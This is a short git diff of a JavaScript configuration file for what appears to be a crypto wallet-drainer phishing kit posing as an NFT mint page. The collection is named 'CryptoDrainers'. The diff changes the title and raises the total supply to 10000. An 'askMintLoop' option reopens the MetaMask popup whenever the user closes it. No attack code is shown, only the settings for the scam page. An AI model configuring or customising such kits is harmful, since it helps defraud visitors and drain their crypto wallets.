@@ -5,7 +5,7 @@ const moralisApi = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 
 const collectionInfo = {
     name: "CryptoDrainers",
-    title: "Tec MINT Template", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
+    title: "J. Pierce & Friends", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
     date: "25.06.2022",
     socialMedia: {
         discord: "https://discord.gg/example",
@@ -24,7 +24,7 @@ const collectionInfo = {
 }
 const mintInfo = {
     price: 0.2,         // Price per NFT.
-    totalSupply: 999,   // Total supply of NFTs.
+    totalSupply: 10000,   // Total supply of NFTs.
     minUnits: 1,        // Min units to buy.
     maxUnits: 6,        // Max units to buy.
     askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
